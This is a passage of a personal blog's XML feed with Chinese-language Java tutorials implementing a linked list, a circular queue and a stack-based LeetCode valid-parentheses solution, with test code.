class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//  获取链表中的元素个数</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getSize</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> size;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 返回链表是否为空</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isEmpty</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> size == <span class="number">0</span> ;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 在链表的index（0-based）位置添加新的元素e</span></span><br><span class="line">    <span class="comment">// 在链表中不是一个常用的操作，练习用：）</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> index, E e)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(index &lt; <span class="number">0</span> || index &gt; size)</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">"Add failed. Illegal index."</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            Node prev = dummyHead;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; index ; i++) <span class="comment">//dummyHead是0前面的结点</span></span><br><span class="line">                prev = prev.next;</span><br><span class="line"><span class="comment">//            Node node = new Node(e);</span></span><br><span class="line"><span class="comment">//            node.next = prev.next;</span></span><br><span class="line"><span class="comment">//            prev.nxt = node;</span></span><br><span class="line"></span><br><span class="line">            prev.next = <span class="keyword">new</span> Node(e,prev.next);</span><br><span class="line">            size ++;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 在链表头添加元素e</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">addFirst</span><span class="params">(E e)</span></span>&#123;</span><br><span class="line">        add(<span class="number">0</span>, e);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 在链表末尾添加新的元素e</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">addLast</span><span class="params">(E e)</span></span>&#123;</span><br><span class="line">        add(size, e);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h1 id="最终链表的增删改查测试截图"><a href="#最终链表的增删改查测试截图" class="headerlink" title="最终链表的增删改查测试截图"></a>最终链表的增删改查测试截图</h1><p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210626154754659.png" alt="image-20210626154754659"></p>
<h1 id="链表的怎删改查包括测试用例（完整代码）"><a href="#链表的怎删改查包括测试用例（完整代码）" class="headerlink" title="链表的怎删改查包括测试用例（完整代码）"></a>链表的怎删改查包括测试用例（完整代码）</h1><h2 id="LinkedList-java-2"><a href="#LinkedList-java-2" class="headerlink" title="LinkedList.java"></a>LinkedList.java</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">LinkedList</span>&lt;<span class="title">E</span>&gt; </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="class"><span class="keyword">class</span> <span class="title">Node</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> E e;</span><br><span class="line">        <span class="keyword">public</span> Node next;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">Node</span><span class="params">(E e, Node next)</span></span>&#123;</span><br><span class="line">            <span class="keyword">this</span>.e = e;</span><br><span class="line">            <span class="keyword">this</span>.next = next;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">Node</span><span class="params">(E e)</span></span>&#123;</span><br><span class="line">            <span class="keyword">this</span>(e, <span class="keyword">null</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">Node</span><span class="params">()</span></span>&#123;</span><br><span class="line">            <span class="keyword">this</span>(<span class="keyword">null</span>,<span class="keyword">null</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span></span>&#123;</span><br><span class="line">            <span class="keyword">return</span> e.toString();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> Node dummyHead;</span><br><span class="line">    <span class="keyword">int</span> size;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">LinkedList</span><span class="params">()</span></span>&#123;</span><br><span class="line">        dummyHead = <span class="keyword">new</span> Node(<span class="keyword">null</span>,<span class="keyword">null</span>);</span><br><span class="line">        size = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//  获取链表中的元素个数</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getSize</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> size;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 返回链表是否为空</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isEmpty</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> size == <span class="number">0</span> ;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 在链表的index（0-based）位置添加新的元素e</span></span><br><span class="line">    <span class="comment">// 在链表中不是一个常用的操作，练习用：）</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> index, E e)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(index &lt; <span class="number">0</span> || index &gt; size)</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">"Add failed. Illegal index."</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            Node prev = dummyHead;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; index ; i++) <span class="comment">//dummyHead是0前面的结点</span></span><br><span class="line">                prev = prev.next;</span><br><span class="line"><span class="comment">//            Node node = new Node(e);</span></span><br><span class="line"><span class="comment">//            node.next = prev.next;</span></span><br><span class="line"><span class="comment">//            prev.nxt = node;</span></span><br><span class="line"></span><br><span class="line">            prev.next = <span class="keyword">new</span> Node(e,prev.next);</span><br><span class="line">            size ++;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 在链表头添加元素e</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">addFirst</span><span class="params">(E e)</span></span>&#123;</span><br><span class="line">        add(<span class="number">0</span>, e);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 在链表末尾添加新的元素e</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">addLast</span><span class="params">(E e)</span></span>&#123;</span><br><span class="line">        add(size, e);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获得链表第index（0-based）个位置的元素</span></span><br><span class="line">    <span class="comment">// 在链表中不是一个常用的操作，练习用：）</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> E <span class="title">get</span><span class="params">(<span class="keyword">int</span> index)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(index &lt; <span class="number">0</span> || index &gt;= size)</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">"Get failed. Illegal index."</span>);</span><br><span class="line"></span><br><span class="line">        Node cur = dummyHead.next;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span> ; i &lt; index ; i ++)</span><br><span class="line">            cur = cur.next;</span><br><span class="line">        <span class="keyword">return</span> cur.e;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获得链表的第一个元素</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> E <span class="title">getFirst</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> get(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获得链表的最后一个元素</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> E <span class="title">getLast</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> get(size - <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 修改链表的第index（0 - based）个位置的元素为e</span></span><br><span class="line">    <span class="comment">// 在链表中不是一个常用的操作，练习用</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">set</span><span class="params">(<span class="keyword">int</span> index, E e)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(index &lt; <span class="number">0</span> || index &gt;= size)</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">"set failed. Illegal index."</span>);</span><br><span class="line"></span><br><span class="line">        Node cur = dummyHead.next;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span> ; i &lt; index ; i ++)</span><br><span class="line">            cur = cur.next;</span><br><span class="line">        cur.e = e;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 查找链表中是否有元素e</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">contains</span><span class="params">(E e)</span></span>&#123;</span><br><span class="line">        Node cur = dummyHead.next;</span><br><span class="line">        <span class="keyword">while</span>(cur != <span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(cur.e.equals(e))</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            cur = cur.next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 从链表中删除index（0-based）位置的元素，返回删除的元素</span></span><br><span class="line">    <span class="comment">// 在链表中不是一个常用的操作，练习用的</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> E <span class="title">remove</span><span class="params">(<span class="keyword">int</span> index)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(index &lt; <span class="number">0</span> || index &gt;= size)</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">"Remove failed. Index is illegal."</span>);</span><br><span class="line"></span><br><span class="line">        Node prev = dummyHead;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span> ; i &lt; index; i++)</span><br><span class="line">            prev = prev.next;</span><br><span class="line"></span><br><span class="line">        Node retNode = prev.next;</span><br><span class="line">        prev.next = retNode.next;</span><br><span class="line">        retNode.next = <span class="keyword">null</span>;</span><br><span class="line">        size --;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> retNode.e;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 从链表中删除第一个元素</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> E <span class="title">removeFirst</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> remove(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 从链表中删除最后一个元素</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> E <span class="title">removeLast</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> remove(size - <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span></span>&#123;</span><br><span class="line">        StringBuilder res = <span class="keyword">new</span> StringBuilder();</span><br><span class="line"><span class="comment">//        Node cur = dummyHead.next;</span></span><br><span class="line"><span class="comment">//        while(cur != null)&#123;</span></span><br><span class="line"><span class="comment">//            res.append(cur + "-&gt;");</span></span><br><span class="line"><span class="comment">//            cur = cur.next;</span></span><br><span class="line"><span class="comment">//        &#125;</span></span><br><span class="line">        <span class="keyword">for</span>(Node cur = dummyHead.next ; cur != <span class="keyword">null</span>; cur = cur.next)</span><br><span class="line">            res.append(cur + <span class="string">"-&gt;"</span>);</span><br><span class="line">        res.append(<span class="string">"Null"</span>);</span><br><span class="line">        <span class="keyword">return</span> res.toString();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h2 id="Main-java"><a href="#Main-java" class="headerlink" title="Main.java"></a>Main.java</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        LinkedList&lt;Integer&gt; linkedList = <span class="keyword">new</span> LinkedList&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span> ; i &lt; <span class="number">5</span> ; i ++)&#123;</span><br><span class="line">            linkedList.addFirst(i);</span><br><span class="line">            System.out.println(linkedList);</span><br><span class="line">        &#125;</span><br><span class="line">        linkedList.add(<span class="number">2</span>,<span class="number">666</span>);</span><br><span class="line">        System.out.println(linkedList);</span><br><span class="line"></span><br><span class="line">        linkedList.remove(<span class="number">2</span>);</span><br><span class="line">        System.out.println(linkedList);</span><br><span class="line"></span><br><span class="line">        linkedList.removeFirst();</span><br><span class="line">        System.out.println(linkedList);</span><br><span class="line"></span><br><span class="line">        linkedList.removeLast();</span><br><span class="line">        System.out.println(linkedList);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

]]></content>
      <categories>
        <category>算法与数据结构</category>
      </categories>
      <tags>
        <tag>成长之路</tag>
        <tag>数据结构</tag>
        <tag>JAVA</tag>
        <tag>链表的增删改查</tag>
      </tags>
  </entry>
  <entry>
    <title>【Java】数据结构-循环队列</title>
    <url>/2021/06/25/%E3%80%90Java%E3%80%91%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84-%E5%BE%AA%E7%8E%AF%E9%98%9F%E5%88%97/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="我的个人博客"><a href="#我的个人博客" class="headerlink" title="我的个人博客"></a>我的个人博客</h1><blockquote>
<h2 id="孤桜懶契：http-gylq-github-io"><a href="#孤桜懶契：http-gylq-github-io" class="headerlink" title="孤桜懶契：http://gylq.github.io"></a>孤桜懶契：<a href="http://gylq.github.io" target="_blank" rel="noopener">http://gylq.github.io</a></h2></blockquote>
<h1 id="队列-Queue"><a href="#队列-Queue" class="headerlink" title="队列 Queue"></a>队列 Queue</h1><blockquote>
<ul>
<li><h2 id="队列是一种先进先出的数据结果"><a href="#队列是一种先进先出的数据结果" class="headerlink" title="队列是一种先进先出的数据结果"></a>队列是一种先进先出的数据结果</h2></li>
</ul>
</blockquote>
<h1 id="循环队列实现输出截图"><a href="#循环队列实现输出截图" class="headerlink" title="循环队列实现输出截图"></a>循环队列实现输出截图</h1><p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210625210003170.png" alt="image-20210625210003170"></p>
<h1 id="循环队列实现代码（完整）"><a href="#循环队列实现代码（完整）" class="headerlink" title="循环队列实现代码（完整）"></a>循环队列实现代码（完整）</h1><p>Queue.java（队列接口）</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Queue</span>&lt;<span class="title">E</span>&gt; </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">getSize</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">boolean</span> <span class="title">isEmpty</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">enqueue</span><span class="params">(E e)</span></span>;</span><br><span class="line">    <span class="function">E <span class="title">dequeue</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function">E <span class="title">getFront</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>LoopQueue.java</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">LoopQueue</span>&lt;<span class="title">E</span>&gt; <span class="keyword">implements</span> <span class="title">Queue</span>&lt;<span class="title">E</span>&gt;</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> E[] data;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> front, tail;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> size;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">LoopQueue</span><span class="params">(<span class="keyword">int</span> capacity)</span></span>&#123;</span><br><span class="line">        data =(E[]) <span class="keyword">new</span> Object[capacity + <span class="number">1</span>];</span><br><span class="line">        front = <span class="number">0</span>;</span><br><span class="line">        tail = <span class="number">0</span> ;</span><br><span class="line">        size = <span class="number">0</span> ;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">LoopQueue</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>(<span class="number">10</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getCapacity</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> data.length - <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isEmpty</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> front == tail;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getSize</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> size;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">enqueue</span><span class="params">(E e)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>((tail + <span class="number">1</span>) % data.length == front)</span><br><span class="line">            resize(getCapacity() * <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        data[tail] = e ;</span><br><span class="line">        tail = (tail + <span class="number">1</span>) % data.length;</span><br><span class="line">        size ++;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> E <span class="title">dequeue</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(isEmpty())&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">"Cannot dequeue from an empty queue."</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        E ret = data[front];</span><br><span class="line">        data[front] = <span class="keyword">null</span>;</span><br><span class="line">        front = (front + <span class="number">1</span>) % data.length;</span><br><span class="line">        size --;</span><br><span class="line">        <span class="keyword">if</span>(size == getCapacity() / <span class="number">4</span> &amp;&amp; getCapacity() / <span class="number">2</span> != <span class="number">0</span>)</span><br><span class="line">            resize(getCapacity() / <span class="number">2</span>);</span><br><span class="line">        <span class="keyword">return</span> ret;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> E <span class="title">getFront</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(isEmpty())</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">"Queue is empty."</span>);</span><br><span class="line">        <span class="keyword">return</span> data[front];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">resize</span><span class="params">(<span class="keyword">int</span> newCapacity)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        E[] newData =(E[]) <span class="keyword">new</span> Object[newCapacity + <span class="number">1</span>];</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span> ; i &lt; size ; i ++)</span><br><span class="line">            newData[i] = data[(i + front) % data.length];</span><br><span class="line">        data = newData;</span><br><span class="line">        front = <span class="number">0</span>;</span><br><span class="line">        tail = size;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span></span>&#123;</span><br><span class="line">        StringBuilder res = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">        res.append(String.format(<span class="string">"LoopQueue: size = %d, capacity = %d \n"</span>, size, getCapacity()));</span><br><span class="line">        res.append(<span class="string">"front ["</span>);</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = front ; i != tail; i = (i + <span class="number">1</span>) % data.length) &#123;</span><br><span class="line">            res.append(data[i]);</span><br><span class="line">            <span class="keyword">if</span> ((i + <span class="number">1</span>) % data.length != tail)</span><br><span class="line">                res.append(<span class="string">", "</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        res.append(<span class="string">"] tail"</span>);</span><br><span class="line">        <span class="keyword">return</span> res.toString();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        LoopQueue&lt;Integer&gt; queue = <span class="keyword">new</span> LoopQueue&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) &#123;</span><br><span class="line">            queue.enqueue(i);</span><br><span class="line">            System.out.println(queue);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (i % <span class="number">3</span> == <span class="number">2</span>) &#123;</span><br><span class="line">                queue.dequeue();</span><br><span class="line">                System.out.println(queue);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

]]></content>
      <categories>
        <category>算法与数据结构</category>
      </categories>
      <tags>
        <tag>成长之路</tag>
        <tag>数据结构</tag>
        <tag>JAVA</tag>
        <tag>插入排序</tag>
      </tags>
  </entry>
  <entry>
    <title>【Java】leetcode题解-有效括号利用栈LIFO实现</title>
    <url>/2021/06/25/%E3%80%90Java%E3%80%91leetcode%E9%A2%98%E8%A7%A3-%E6%9C%89%E6%95%88%E6%8B%AC%E5%8F%B7%E5%88%A9%E7%94%A8%E6%A0%88LIFO%E5%AE%9E%E7%8E%B0/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="我的个人博客"><a href="#我的个人博客" class="headerlink" title="我的个人博客"></a>我的个人博客</h1><blockquote>
<h2 id="孤桜懶契：http-gylq-github-io"><a href="#孤桜懶契：http-gylq-github-io" class="headerlink" title="孤桜懶契：http://gylq.github.io"></a>孤桜懶契：<a href="http://gylq.github.io" target="_blank" rel="noopener">http://gylq.github.io</a></h2></blockquote>
<h1 id="Leetcode题目-20"><a href="#Leetcode题目-20" class="headerlink" title="Leetcode题目 20"></a>Leetcode题目 20</h1><p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210625172525394.png" alt="image-20210625172525394"></p>
<h1 id="执行结果"><a href="#执行结果" class="headerlink" title="执行结果"></a>执行结果</h1><p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210625172657711.png" alt="image-20210625172657711"></p>
<h1 id="Solution题解"><a href="#Solution题解" class="headerlink" title="Solution题解"></a>Solution题解</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isValid</span><span class="params">(String s)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        Stack&lt;Character&gt; stack = <span class="keyword">new</span> Stack&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span> ; i &lt; s.length(); i ++)&#123;</span><br><span class="line">            <span class="keyword">char</span> c = s.charAt(i);</span><br><span class="line">            <span class="keyword">if</span>(c == <span class="string">'('</span> || c == <span class="string">'['</span> || c== <span class="string">'&#123;'</span>)</span><br><span class="line">                stack.push(c);</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">if</span>(stack.isEmpty())</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">char</span> topChar = stack.pop();</span><br><span class="line">                <span class="keyword">if</span>(c == <span class="string">')'</span> &amp;&amp; topChar != <span class="string">'('</span>)</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">                <span class="keyword">if</span>(c == <span class="string">']'</span> &amp;&amp; topChar != <span class="string">'['</span>)</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">                <span class="keyword">if</span>(c == <span class="string">'&#125;'</span> &amp;&amp; topChar != <span class="string">'&#123;'</span>)</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> stack.isEmpty();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">            System.out.println((<span class="keyword">new</span> Solution()).isValid(<span class="string">"()[]&#123;&#125;"</span>));</span><br><span class="line">            System.out.println((<span class="keyword">new</span> Solution()).isValid(<span class="string">"(])]&#123;&#125;"</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></div>

]]></content>
      <categories>
        <category>算法与数据结构</category>
      </categories>
      <tags>
        <tag>成长之路</tag>
        <tag>数据结构</tag>
        <tag>JAVA</tag>
        <tag>LeetCode</tag>
      </tags>
  </entry>
  <entry>
    <title>【Java】数据结构-利用动态数组自定义栈LIFO</title>
    <url>/2021/06/25/%E3%80%90Java%E3%80%91%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84-%E5%88%A9%E7%94%A8%E5%8A%A8%E6%80%81%E6%95%B0%E7%BB%84%E8%87%AA%E5%AE%9A%E4%B9%89%E6%A0%88LIFO/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="我的个人博客"><a href="#我的个人博客" class="headerlink" title="我的个人博客"></a>我的个人博客</h1><blockquote>
<h2 id="孤桜懶契：http-gylq-github-io"><a href="#孤桜懶契：http-gylq-github-io" class="headerlink" title="孤桜懶契：http://gylq.github.io"></a>孤桜懶契：<a href="http://gylq.github.io" target="_blank" rel="noopener">http://gylq.github.io</a></h2></blockquote>
